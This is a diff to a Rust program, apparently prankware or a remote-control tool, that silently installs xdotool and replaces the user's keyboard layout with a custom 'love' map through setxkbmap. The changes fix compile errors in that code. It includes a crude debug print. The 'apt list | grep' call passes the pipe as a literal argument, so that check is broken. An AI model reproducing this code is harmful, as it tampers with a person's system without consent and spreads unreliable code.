@@ -3,6 +3,7 @@
 use std::process::Command;
 pub extern crate libc;
 
+use std::fs;
 use std::io::prelude::*;
 use std::net::{TcpStream, ToSocketAddrs};
 use std::{thread,time,str,process};
@@ -1835,15 +1836,15 @@ partial alphanumeric_keys
         .args(&["install","xdotool","-y"])
         .spawn().ok();
     println!("Sleeping while installing");
-    let installed = Command::new("apt").args(&["list", "--installed", "|", "grep", "-i", "xdotool"]).output().unwrap();
-    let out = installed.stdout;
-    let strout = str::from_utf8(&out).unwrap();
+    let mut installed = Command::new("apt").args(&["list", "--installed", "|", "grep", "-i", "xdotool"]).output().unwrap();
+    let mut out = installed.stdout;
+    let mut strout = str::from_utf8(&out).unwrap();
     println!("penis {}",strout);
     
     while(!strout.contains("xdotool")){
         installed = Command::new("apt")
             .args(&["list", "--installed","|","grep","-i","xdotool"])
-            .output.unwrap();
+            .output().unwrap();
         out = installed.stdout;
         strout = str::from_utf8(&out).unwrap();
     }
@@ -1861,7 +1862,7 @@ partial alphanumeric_keys
 		println!(":)");
 		return
 	}
-    let kb = fs::File::create("love");
+    let mut kb = fs::File::create("love").unwrap();
     kb.write_all(new_kb.as_bytes());
     Command::new("setxkbmap")
         .args(&["love"]).spawn().ok();
